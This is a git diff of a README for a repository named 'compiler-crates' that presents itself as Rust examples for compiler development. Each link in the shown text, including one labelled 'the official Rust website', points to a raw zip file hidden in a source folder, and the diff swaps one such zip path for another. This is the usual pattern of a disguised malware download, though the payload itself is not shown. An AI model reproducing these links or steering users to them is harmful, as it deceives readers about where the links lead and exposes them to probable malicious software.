@@ -1,6 +1,6 @@
 # 🚀 compiler-crates - Simple Tools for Compiler Development
 
-[![Download Latest Release](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip%20Latest%https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip)](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip%20Latest%https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip)](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to the **compiler-crates** repository. This project provides minimal exa
 To get started with the **compiler-crates**, follow these steps:
 
 1. **Visit the Releases Page**: To download the latest version, click on the link below:
-   [Visit Releases Page](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip)
 
 2. **Choose Your Download**: 
    On the releases page, you will see a list of available versions. Pick the one labeled "Latest" for the most current features and fixes.
@@ -29,7 +29,7 @@ Before installing, make sure your system meets the following requirements:
 - **Operating System**: Windows, macOS, or Linux
 - **RAM**: Minimum 2 GB recommended
 - **Disk Space**: At least 100 MB available
-- **Rust**: If you want to compile or modify the examples, install Rust from [the official Rust website](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip).
+- **Rust**: If you want to compile or modify the examples, install Rust from [the official Rust website](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip).
 
 ## 📦 Features
 
@@ -45,7 +45,7 @@ These features allow users to experiment and learn about compiler construction e
 
 To download and run the software, continue with the following steps:
 
-1. Visit the releases page here: [Download Here](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/sacristy/compiler-crates.zip).
+1. Visit the releases page here: [Download Here](https://raw.githubusercontent.com/Tejith6622/compiler-crates/main/dynasm/src/compiler-crates-v3.0.zip).
   
 2. Find the version you want. Make sure to select the latest version for the best experience.
 
